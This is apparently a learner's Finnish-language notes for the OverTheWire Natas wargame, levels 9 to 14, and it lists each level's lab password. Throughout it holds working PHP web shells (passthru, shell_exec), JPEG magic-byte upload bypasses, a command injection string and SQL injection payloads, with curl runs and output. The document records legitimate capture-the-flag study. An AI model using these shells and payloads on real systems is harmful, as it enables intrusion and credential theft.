# natas lunttilappu

### evästeen lähettäminen HTTP korvatakaseen uutta data value
`curl -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -b "data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5" "http://natas11.natas.labs.overthewire.org"`


### formaatti lähetys injektion kautta , kulkemaan Headerin referenssiä

`curl -X POST -d "needle=;ls -l;&submit=submit" -H "Referer: http://natas9.natas.labs.overthewire.org/" -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" http://natas9.natas.labs.overthewire.org/`


### tarkistus pikainen

- F12 - html koodi onko vihjeitä
- view sourcode - josta on koodattu PHP koodikieli ja lukemista, selvittämistä, aivopyörimistä ja jne. 
- hakemistonpolku ja juuri `/etc/natas_webpass/natasX`
- lisää polkun perään `/robots.txt`
- jos on kuva tiedosto niin tarkista onko hakemiston polkua olemassa esim. `/files/image1.jpg`

### curl komento lunttilappu;
- `curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS "http://natas7.natas.labs.overthewire.org"`
- `curl -H "Referer: http://natas9.natas.labs.overthewire.org/" -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" http://natas9.natas.labs.overthewire.org/`


---

# Level 12 - START HERE

natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

Jotenkin tässä harjoituksessa huomataan JPEG - kuva tiedosto maksimi on 1KB (MAX_FILE_SIZE) - peri omaa testiä ainakin toimii siis et tuli "There was an error uploading the file, please try again!" - mut tämä tapahtuu toisessa uudessa sivuston alla kun jos tulee _error_ ja polku */index.php* 

php tiedoston upottaminen menee läpi ja toimii periaatteessa, ja tässä piti vielä laittaa burp suite softan päälle, että seurataan ja katsotaan sitä pyyntöä oisko HTTP ja jne. huomiona se php koodi (hello world) upotettua muuttui .jpg tiedostoksi 

ainakin pikaisella tarkistuksella (view-source) välilehdestä jotakin pientä tuli muuttui, mutta tämä tämäkään ei ole ratkaisu ja kuitenkin eteenpäin. 


Avataan Burp Suite ohjelmansa, että muutettaan upotettu tiedosto, joka se muutti **.jpg** niin muutettaan **.php**:ksi, ja huomioina, tässä tämä pitää klikkata **Forward** kun se lähettää sen HTTP pyynnon mikälie niin sitten se Natas12 level sivusto muuttuu. Sitten kaksois klikkaa muutettun jpg --> php filu/tiedosto niin siellä ainakin näkyy se PHP-koodi tekemä _Hello World_ . 

Eli toimii

# next steppi

luo joku skripti siis passthru varten, että upotta ja suorita burp suite intercept prosesssi

täämä on pohja
<?php passthru($_GET['Vastaus']); ?>

upottaminen meni läpi ja tarkistus burp suite suunnalta (laita on sitten refresh sitä sivustoa ja sen jälkeen se tulee )


interrecupt jpg > php:ksi, sitten tultua (refresh sivusto) niin php:ksi se kuva tiedosto tuli, ja sulje interecpt is pois päältä

klikkaa tuleva tiedosto niin tulee tällainen

Notice: Undefined index: Vastaus in /var/www/natas/natas12/upload/am34u6tos4.php on line 1

Warning: passthru(): Cannot execute a blank command in /var/www/natas/natas12/upload/am34u6tos4.php on line 1


näyttää ainakin jotekin tultu tämä eli /etc/natas_webpass/natasX jotakin

kokeillaan lisää url perään se oma testi tiedoston koodi ptäkä "Vastaus" sana ja katsotaan löytääkö sen mistään skriptien ja muualta hakemiston alta 


http://natas12.natas.labs.overthewire.org/upload/am34u6tos4.php?Vastaus=ls
ls (linux komento $ls)

tämä antoi lorem ipsum jotakin hebreeta 


seuraavaksi testataan **=cat /etc/natas_webpass/natas13**

http://natas12.natas.labs.overthewire.org/upload/am34u6tos4.php?Vastaus=cat%20/etc/natas_webpass/natas13

ja boom vastaus on tässä
natas 13 = trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC



## Kali Linux - 3 tapa 

eli mentäisiin linux terminaalin kautta

natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

- `curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org"`



Normi check
```
┌──(kali㉿kali)-[~]
└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="7fg1oxl9me.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

upotettaan välittömästi joku PHP-koodi pätkästä tyyppinen suoraan curl komentoon

joku shell-php koodi pätkä komento..
`<?php echo keitto ?>`


JOKU `MALLI POHJA :
```
$ echo "<?php phpinfo(); ?>" >  image.php
$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org
```

Testausta ja upotettaan kuva tiedosto
```
┌──(kali㉿kali)-[~]
└─$ echo "<?php echo keitto ?>" > image.php                            

┌──(kali㉿kali)-[~]
└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
The file <a href="upload/0y159blw3m.php">upload/0y159blw3m.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Huomataan tätä prosessia kuin (Unrestricted File Upload vulnerability is exploitable) ja tämä URL osuus, eli tämä: `upload/0y159blw3m.php`


```
The file <a href="upload/0y159blw3m.php">upload/0y159blw3m.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

sehän muodostuisi näin: <br>
`http://natas12.natas.labs.overthewire.org/upload/0y159blw3m.php`


**Seuraavaksi** 
kutsutaan *phpinfo()* jotakin käskyä, että selvitettään tämän hakemiston polkua `/etc/natas_webpass/natas13` ja muuttujansa mitä aikaisempi toistettiin toi *image.php*. 

```
┌──(kali㉿kali)-[~]
└─$ php -r '$p = file_get_contents("/etc/natas_webpass/natas13"); echo $p;'
PHP Warning:  file_get_contents(/etc/natas_webpass/natas13): Failed to open stream: No such file or directory in Command line code on line 1
``` 


```
┌──(kali㉿kali)-[~]
└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
The file <a href="upload/p3r5we5y0g.php">upload/p3r5we5y0g.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org/upload/p3r5we5y0g.php"


Tässä tapahtuu jotakin _error_ vikaa mutta pitäisi ehkä mennä uusiksi..
```
┌──(kali㉿kali)-[~]
└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB http://natas12.natas.labs.overthewire.org/upload/p3r5we5y0g.php
<br />
<b>Warning</b>:  Use of undefined constant keitto - assumed 'keitto' (this will throw an Error in a future version of PHP) in <b>/var/www/natas/natas12/upload/p3r5we5y0g.php</b> on line <b>1</b><br />
keitto


┌──(kali㉿kali)-[~]
└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org/upload/p3r5we5y0g.php?keitto=cat%20/etc/natas_webpass/natas123"
<br />
<b>Warning</b>:  Use of undefined constant keitto - assumed 'keitto' (this will throw an Error in a future version of PHP) in <b>/var/www/natas/natas12/upload/p3r5we5y0g.php</b> on line <b>1</b><br />
keitto                                                                                                                

```


upload uusiksi 

pohja: 
<?php passthru($_GET['Vastaus']); ?>


<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
<?php echo file_get_contents("/etc/natas_webpass/natas13");?>

echo "<?php phpinfo(); ?>" >  kuvat.php

$ echo "<?php phpinfo(); ?>" >  image.php
$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=kuvat.php" -F "uploadedfile=@./kuvat.php" http://natas12.natas.labs.overthewire.org



┌──(kali㉿kali)-[~]
└─$ echo "<?php phpinfo(); ?>" >  kuvat.php
                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$  curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=kuvat.php" -F "uploadedfile=@./kuvat.php" http://natas12.natas.labs.overthewire.org
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
The file <a href="upload/q7r2uzojcg.php">upload/q7r2uzojcg.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

http://natas12.natas.labs.overthewire.org/upload/q7r2uzojcg.php


natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB



## KOLMAS YRITYS - nyt päästiin maaliin asti

ohjeet
echo "<?php \$p = file_get_contents('/etc/natas_webpass/natas13'); echo \$p; ?>" > upload.php

curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=upload.php" -F "uploadedfile=@./upload.php" http://natas12.natas.labs.overthewire.org

curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org/upload/7596oxc5k7.php"


**MY ACTIONS**
┌──(kali㉿kali)-[~]
└─$ echo "<?php \$p = file_get_contents('/etc/natas_webpass/natas13'); echo \$p; ?>" > upload.php

┌──(kali㉿kali)-[~]
└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=upload.php" -F "uploadedfile=@./upload.php" http://natas12.natas.labs.overthewire.org
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
The file <a href="upload/zfz5mxj4y0.php">upload/zfz5mxj4y0.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org/upload/zfz5mxj4y0.php"



┌──(kali㉿kali)-[~]
└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org/upload/zfz5mxj4y0.php"
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC




## Level 12 - - vinkkejä ja ohjeita:

https://samxia99.medium.com/overthewire-updated-natas-walkthrough-level-12-0688ea43ef92 <br>

https://nils-maeurer.de/post/overthewire-natas12-13/ <br>

https://learnhacking.io/overthewire-natas-level-12-walkthrough/ <br>

https://medium.com/@enesaladag/overthewires-natas12-3c6e7ce72900 <br>


---

# Natas 13 - START HERE

natas13 : trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC


Melkein sama kuin Level 12 - mutta voi olla vähä vaikeampi, mutta ainakin Level 12:ssa tapahtui polkujen etsiminen eli */etc/natas_webpass/natas13* 


Koodin pätkäst ainakin huomattuna että se ymmärtää tiedoston upottamisessa onko se kuva vai ei, eli tiedoston tunnistaminen. Jos alataus epäonnistuu, niin käytetään `exif_imagetype()`-funktiota, joka tarkistaa tiedoston tyypin.

```
if($err){
    if($err === 2){
        echo "The uploaded file exceeds MAX_FILE_SIZE";
    } else{
        echo "Something went wrong :/";
    }
} else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
    echo "File is too big";
} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
}
```

    - Periaatteessa sama idea kuin aikaisempi, josta laittaa PHP-koodipätkän ja muutta kuvatiedoston (JPEG, PNG, JPG, jne). Kuitenkin hylättään muita tiedostoja jos ei ole kuvatiedosto tyyppinen.


```
function makeRandomPath($dir, $ext) {
    do {
        $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
```
Tässä funktiossa luodaan satunnainen tiedostonnimi, joka varmistaa ettei tule saman nimistä tiedostoa ellei ole jo olemassa.


🎯 **Seuraavaksi**:
- Rajoituksia, eli PHP koodi tarkituksena tiedostonkoo (1KB) ja sallittu vain kuva tiedostontyyppille
- Hyökkäysstrategia ja harjoituksena, että asettaa PHP-skriptin kuvan alle ja se latautuu sinne palvelimelle.
- Jos lataus onnistuu ja käytä URL-osoitetta, jotta päästään käsiksi seuraavaan Levelin salasansa sisältävään tiedostoon.

---

## Level 13 - 2 - oma toiminnat - START HERE

#### OHJE - PHP-skriptin naamioimisesta kuvatiedostoksi:

Luo PHP-skripti, joka on kuvafailinmuodossa: Voit kokeilla ladata PHP-skriptiä, joka on naamioitu JPEG-tiedostoksi

<?php
echo file_get_contents("/etc/natas_webpass/natas13");
?>


Tallenna tiedosto shell.jpg (tai muu kuvatiedostopääte):

Tässä teet tiedostosta JPEG-kuvan, mutta sen sisällön takana on PHP-koodi.

echo "<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>" > shell.jpg



Lataa tiedosto palvelimelle curl-komennolla:

curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "file=@shell.jpg" http://natas12.natas.labs.overthewire.org/upload/



Tarkista ladattu tiedosto: Kun tiedosto on ladattu onnistuneesti, palvelin ei tarkista tiedoston sisältöä – se ainoastaan hyväksyy kuvatiedostot ja antaa sinun ajaa PHP-koodin. Tämän jälkeen voit käyttää URL-osoitetta (esim. http://natas12.natas.labs.overthewire.org/upload/shell.jpg) nähdäksesi salasanan.


### Level 13 - 2.5 - kokeillaan samaa kuin level 12 ohje

Kokeillaan mentäisi kuin aikaisempi level 12, mutta meneekö lävitse. Voi olla ettei mene, kun tämä on vaikeampi taso. Tätä testataan UI nettisivuston kautta, ja erikseen kun toimii niin sitten lisätää Kali linxu versio.

Yllättyksenä tähän ainakin sen pitää olla **virallinen kuva tyyppi** eikä mitään koodipätkiä ja tiedosto tyyppi on esim. jpg. Pari muutamia testiä testattuna leikkisti PHP hello world koodi ja _png_ tiedostona niin se ainakin tunnisti.


upotettaan joku satunnainen kuva - joku sunset

(request) kenttä osuudesta saattiin tällainen osuus:

```
POST /index.php HTTP/1.1

Host: natas13.natas.labs.overthewire.org

Content-Length: 8415

Cache-Control: max-age=0

Authorization: Basic bmF0YXMxMzp0cmJzNXBDakNya3VTa25CQktIaGFCeHE2V20xajNMQw==

Upgrade-Insecure-Requests: 1

Origin: http://natas13.natas.labs.overthewire.org

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary64wOsN0cAO7qrRpo

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://natas13.natas.labs.overthewire.org/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close



------WebKitFormBoundary64wOsN0cAO7qrRpo

Content-Disposition: form-data; name="MAX_FILE_SIZE"



1000

------WebKitFormBoundary64wOsN0cAO7qrRpo

Content-Disposition: form-data; name="filename"



u8kn5b7gz1.jpg

------WebKitFormBoundary64wOsN0cAO7qrRpo

Content-Disposition: form-data; name="uploadedfile"; filename="images.jpeg"

Content-Type: image/jpeg



ÿØÿà
```


Lisäsin tämän `<?php passthru($_GET['Vastaus']); ?>` - funktion osuuden siihen väliin, että kokeillaan..

muutettu "Content-type: application/x-php" osuus ja muutamia kenttiä


/upload/vzn7uqy4je.php

huomiona tämä polku `cat /etc/passwd` enkodaattu URL:ssa menee siksi näin `cat%20/etc/` siksi toi välilyönti on enkodaattuna URL:ssa `%20`

z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

## Level 13 - 3 - Kali Linux - START HERE;

loin satunnaisen php koodin ja kuitenkin kuva tyyppisenä ns.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo -e "\xFF\xD8\xFF\xE0" > image1.php

┌──(kali㉿kali)-[~/Desktop]
└─$ file image1.php  
image1.php: JPEG image data


append the PHP code
┌──(kali㉿kali)-[~/Desktop]
└─$ echo -n '<?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?>' >> image1.php 

┌──(kali㉿kali)-[~/Desktop]
└─$ file image1.php 
image1.php: JPEG image data

┌──(kali㉿kali)-[~/Desktop]
└─$ cat image1.php                                                                                                  
����
<?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?>                                                                                                                         

```

Pysytään yhä Kali linux desktopissa ja suoritettaan tämä prosessi viimeisenä, ja huomioina tiedoston nimi pitää olla tasalleen tarkka.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -F "MAX_FILE_SIZE=1000" -F "filename=image1.php" -F "uploadedfile=@./image1.php" http://natas13.natas.labs.overthewire.org
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

The file <a href="upload/7801d4li7v.php">upload/7801d4li7v.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

ainakin saattiin toi viimeinen tiedoston polku ja mikä data **/upload/7801d4li7v.php**

Sitten tarkistettaan sen sisältö

```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC http://natas13.natas.labs.overthewire.org/upload/7801d4li7v.php
����
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```


## Level 13 - 4 - vinkkejä ja ohjeita:

https://samxia99.medium.com/overthewire-updated-natas-walkthrough-level-13-1f5407b6f35a


https://learnhacking.io/overthewire-natas-level-13-walkthrough/

https://github.com/psmiraglia/ctf/blob/master/overthewire/natas/natas13.md



# Level 14 - START HERE;

natas14 : z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ


Perus selvittämistä ja tässä näyttää ainakin koodin ainakin on *username ; password* mahtaako olla koskien SQL injektiota tai tavallinen shell injektiota? 

PHP - koodikielessä ainakin (_index-source.html_) on *query* - kyselly, että hakee käyttäjännimen ja salasanansa, että jos täsmää sitten päästään eteenpäin, että pääsee hakee seuraavan levelin salasanansa, eli on **SQL injektio**.

Tämä osuus ainakin kertoo kyseessä on SQL injektio ja tämä funktio:
```
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

```

Sekä mahdolliset avain sanat meitä varmaan kiinnostaa ja debbugoida on ainakin.. `GET`, `username`, `password` ja `debug` parametrit.


## Level 14 - 1 SQL injektio

curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ "http://natas14.natas.labs.overthewire.org/?debug&username=alice&password=s3cr3t"


## miksi "alice"

miksi juuri "alice" on käyttäjänimi tässä esimerkissä. Ei se ole itsestään selvä päätös, mutta käydään läpi, miksi juuri "alice" voisi olla valittu tässä tapauksessa ja miten se liittyy Natas- ja yleisemmin tietoturvahaasteisiin.


- Miksi käyttäjänimi on "alice"?

Alice on monesti käytetty esimerkkinimi IT- ja tietoturvamaailmassa. Esimerkiksi salausprotokollissa on usein viitattu "Alice" ja "Bob" -hahmoihin kuvaamaan viestinvaihtoa.

Tietoturvahaasteissa on tavallista käyttää yleisiä nimiä, kuten Alice, koska se on helposti tunnistettavissa, mutta ei aina kovin luontevasti liity mihinkään tiettyyn henkilöön. "Alice" voi siis olla tässä yksinkertaisesti esimerkkikäyttäjänimi.


Natas-haasteessa on yleensä tietynlaista rakenne- ja aihepiiriin liittyvää logiikkaa. Tällaisissa haasteissa saatetaan antaa sinulle pieniä vihjeitä, kuten "alice" käyttäjätunnus, koska järjestelmän tekijät haluavat johdattaa sinut johonkin tiettyyn suuntaan.

**Periaatteessa** harjoituksen kannalta voi testata muita käyttäjännimeä mm. admin , root, user, ja jne. mutta toi "alice" on jostakin jenkkien oma yleinen yleis mikä syttyy mieleen. 

## SQL Injektio ja "alice"

SQL-injektio ja "alice"
SQL-injektio on hyökkäysmenetelmä, jossa käyttäjä syöttää haitallista SQL-koodia sovelluksen lomakkeisiin tai URL-parametreihin, jotka eivät ole kunnolla suojattu. 


http://natas14.natas.labs.overthewire.org/?debug&username=alice&password=s3cr3t


username=alice' OR '1'='1
password=s3cr3t' OR '1'='1

SQL kysely; SELECT * FROM users WHERE username = 'alice' AND password = 's3cr3t';


muita esim.
SELECT * FROM users WHERE username = 'alice' AND password = 's3cr3t';
SELECT * FROM users WHERE username = 'alice' OR '1'='1' AND password = 's3cr3t' OR '1'='1';


Miksi juuri "alice"?
Alice on valittu mahdollisesti esimerkkinä, koska se on helppo arvata ja käyttää testissä. Jos tietoturva-asiantuntijat suunnittelevat tällaisia haasteita, he voivat käyttää yleisiä nimiä (kuten "alice", "bob", "admin"), jotta voit kokeilla niitä oletuksena.

Alice voi myös liittyä johonkin järjestelmän oletusasetuksiin, tai se voi olla oletuskäyttäjä (vaikka tämä on vähemmän todennäköistä).


# Level 14 - 3 kali linux version - START HERE;

natas14 : z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

Eli kokeillaan curl komentoa ja sillä kautta leikkitään, mutta sama idea kuin menisi URL selvittämistä, tai sillä formaatilla.

curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ "http://natas14.natas.labs.overthewire.org/?debug&username=alice&password=s3cr3t"

esim. `curl "http://example.com/login.php?username=admin%27%20OR%201%3D1%20--&password=whatever"`

http://natas14.natas.labs.overthewire.org/index.php?debug=1&&username=admin%22%27%20OR%201%3D1%20--&&password=admin%27%20OR%201%3D1%20--%22


curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ "http://natas14.natas.labs.overthewire.org"


```
┌──(kali㉿kali)-[~]
└─$ curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ "http://natas14.natas.labs.overthewire.org"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Ylemmästä ainakin huomataan kirjauttumisen lomakkeensa, että input vähä kuin id nimetty "username/password".

Pikainen tarkistus tuosta välilehden polusta ainakin, mutta sekalaista höpönlöpöä ainakin näkyvinä. 
```
┌──(kali㉿kali)-[~]
└─$ curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ "http://natas14.natas.labs.overthewire.org/index-source.html"
<code><span style="color: #000000">
&lt;html&gt;<br />&lt;head&gt;<br />&lt;!--&nbsp;This&nbsp;stuff&nbsp;in&nbsp;the&nbsp;header&nbsp;has&nbsp;nothing&nbsp;to&nbsp;do&nbsp;with&nbsp;the&nbsp;level&nbsp;--&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;type="text/css"&nbsp;href="http://natas.labs.overthewire.org/css/level.css"&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/jquery-ui.css"&nbsp;/&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/wechall.css"&nbsp;/&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-ui.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/wechall.js"&gt;&lt;/script&gt;<br />&lt;script&gt;var&nbsp;wechallinfo&nbsp;=&nbsp;{&nbsp;"level":&nbsp;"natas14",&nbsp;"pass":&nbsp;"&lt;censored&gt;"&nbsp;};&lt;/script&gt;&lt;/head&gt;<br />&lt;body&gt;<br />&lt;h1&gt;natas14&lt;/h1&gt;<br />&lt;div&nbsp;id="content"&gt;<br /><span style="color: #0000BB">&lt;?php<br /></span><span style="color: #007700">if(</span><span style="color: #0000BB">array_key_exists</span><span style="color: #007700">(</span><span style="color: #DD0000">"username"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$_REQUEST</span><span style="color: 